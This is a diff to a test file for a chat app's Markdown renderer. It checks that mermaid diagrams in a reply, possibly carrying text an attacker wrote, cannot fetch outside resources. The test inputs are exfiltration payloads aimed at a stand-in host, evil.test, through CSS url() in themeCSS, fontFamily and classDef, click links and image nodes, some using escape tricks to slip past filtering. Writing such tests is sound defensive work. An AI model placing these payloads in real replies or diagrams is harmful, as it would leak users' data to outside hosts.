@@ -117,7 +117,7 @@ describe("A mermaid diagram in a reply", () => {
   const LONG = 30_000;
   const fenced = (source: string) => "```mermaid\n" + source + "\n```";
   // An svg in a code block other than its header's icons.
-  const diagram = (container: HTMLElement) => [...container.querySelectorAll(".code svg")].find((svg) => !svg.closest(".code-head")) ?? null;
+  const diagram = (container: Element) => [...container.querySelectorAll(".code svg")].find((svg) => !svg.closest(".code-head")) ?? null;
   const drawn = (container: HTMLElement) => waitFor(() => expect(diagram(container)).not.toBeNull(), { timeout: LONG });
 
   beforeAll(() => {
@@ -191,28 +191,36 @@ describe("A mermaid diagram in a reply", () => {
   });
 
   // A reply can carry text an attacker wrote (a web page, a file), so a diagram must never make the app fetch anything.
-  it("keeps config, styles and links from reaching off the app", { timeout: LONG }, async () => {
+  it("keeps config, links and labels from reaching off the app", { timeout: LONG }, async () => {
     for (const source of [
-      '%%{init: {"themeCSS": ".x{fill:url(https://evil.test/c?d=SECRET)}"}}%%\nflowchart TD\n  A-->B',
-      '%%{init: {"fontFamily": "x;}.y{fill:url(https://evil.test/f)"}}%%\nflowchart TD\n  A-->B',
-      "---\nconfig:\n  themeCSS: \".x{fill:url(https://evil.test/m)}\"\n---\nflowchart TD\n  A-->B",
+      // Settings a diagram can't change. With `url(…)` in them they aren't drawn at all (below).
+      '%%{init: {"themeCSS": ".evil{fill:red}", "fontFamily": "evil"}}%%\nflowchart TD\n  A-->B',
+      "---\nconfig:\n  themeCSS: .evil{fill:red}\n  fontFamily: evil\n---\nflowchart TD\n  A-->B",
       'flowchart TD\n  A-->B\n  click A href "https://evil.test/k"',
-      "flowchart TD\n  A-->B\n  classDef e fill:url(https://evil.test/d)\n  class A e\n  style B stroke:url(https://evil.test/s)",
       'flowchart TD\n  A["<img src=https://evil.test/h.png>"]-->B["`![x](https://evil.test/md.png)`"]',
+      // mermaid's own escape for `(`, which it turns back into `(` only in the SVG it hands over.
+      "stateDiagram-v2\n  classDef e fill:url#40;https://evil.test/e)\n  A --> B\n  class A e",
     ]) {
       const { container, unmount } = renderDom(<Markdown text={fenced(source)} />);
       await drawn(container);
       const svg = diagram(container)!;
-      // An attacker's URL may show as a label's text; it must never be an attribute or styling a browser fetches.
+      // An attacker's text may show as a label; it must never be an attribute or styling.
       const outbound = [svg, ...svg.querySelectorAll("*")].flatMap((el) => [
         ...[...el.attributes].map((a) => a.value),
         ...(el.tagName.toLowerCase() === "style" ? [el.textContent ?? ""] : []),
       ]);
-      expect(outbound.filter((v) => v.includes("evil.test")), source).toEqual([]);
+      expect(outbound.filter((v) => v.includes("evil")), source).toEqual([]);
       expect(svg.querySelector("img, image, foreignObject"), source).toBeNull();
       unmount();
     }
   });
+
+  /** The code blocks of `sources`, in one reply ahead of a diagram drawn only once each of them has had its turn. */
+  async function drawnAfter(sources: string[]) {
+    const { container } = renderDom(<Markdown text={[...sources, "flowchart TD\n  After-->It"].map(fenced).join("\n\n")} />);
+    await waitFor(() => expect(diagram(container.querySelectorAll(".code")[sources.length])).not.toBeNull(), { timeout: LONG });
+    return [...container.querySelectorAll(".code")].slice(0, -1);
+  }
 
   it("that shows an image isn't drawn, so the image is never fetched", { timeout: LONG }, async () => {
     const fetched: string[] = [];
@@ -225,17 +233,34 @@ describe("A mermaid diagram in a reply", () => {
       },
     );
     try {
-      const source = 'flowchart TD\n  A@{ img: "https://evil.test/a.png?d=SECRET", label: "x" }';
-      // A diagram after it, drawn once the one before has had its turn.
-      const { container } = renderDom(<Markdown text={fenced(source) + "\n\n" + fenced("flowchart TD\n  After-->It")} />);
-      await drawn(container);
-      const [first] = container.querySelectorAll(".code");
-      expect(first.querySelector("svg")).toBeNull();
-      expect(first.querySelector("pre")!.textContent).toBe(source + "\n");
-      expect(first.textContent).toMatch(/links an image/);
+      const sources = [
+        'flowchart TD\n  A@{ img: "https://evil.test/a.png?d=SECRET", label: "x" }',
+        'flowchart TD\n  A@{ "\\x69mg": "https://evil.test/b.png", label: "x" }',
+      ];
+      for (const [i, block] of (await drawnAfter(sources)).entries()) {
+        expect(diagram(block)).toBeNull();
+        expect(block.querySelector("pre")!.textContent).toBe(sources[i] + "\n");
+        expect(block.textContent).toMatch(/links an image/);
+      }
       expect(fetched.filter((url) => url.includes("evil.test"))).toEqual([]);
     } finally {
       vi.unstubAllGlobals();
+    }
+  });
+
+  it("whose styles link outside the app isn't drawn, as they would apply while it is", { timeout: LONG }, async () => {
+    const sources = [
+      '%%{init: {"themeCSS": ".x{fill:url(https://evil.test/c?d=SECRET)}"}}%%\nflowchart TD\n  A-->B',
+      '%%{init: {"fontFamily": "x;}.y{fill:url(https://evil.test/f)"}}%%\nflowchart TD\n  A-->B',
+      '---\nconfig:\n  themeCSS: ".x{fill:url(https://evil.test/m)}"\n---\nflowchart TD\n  A-->B',
+      "stateDiagram-v2\n  classDef e fill:url(https://evil.test/d)\n  A --> B\n  class A e",
+      "classDiagram\n  class A\n  style A fill:url(https://evil.test/s)",
+      "stateDiagram-v2\n  classDef e fill:\\75 rl(https://evil.test/x)\n  A --> B\n  class A e",
+    ];
+    for (const [i, block] of (await drawnAfter(sources)).entries()) {
+      expect(diagram(block)).toBeNull();
+      expect(block.querySelector("pre")!.textContent).toBe(sources[i] + "\n");
+      expect(block.textContent).toMatch(/styles link outside the app/);
     }
   });
 });
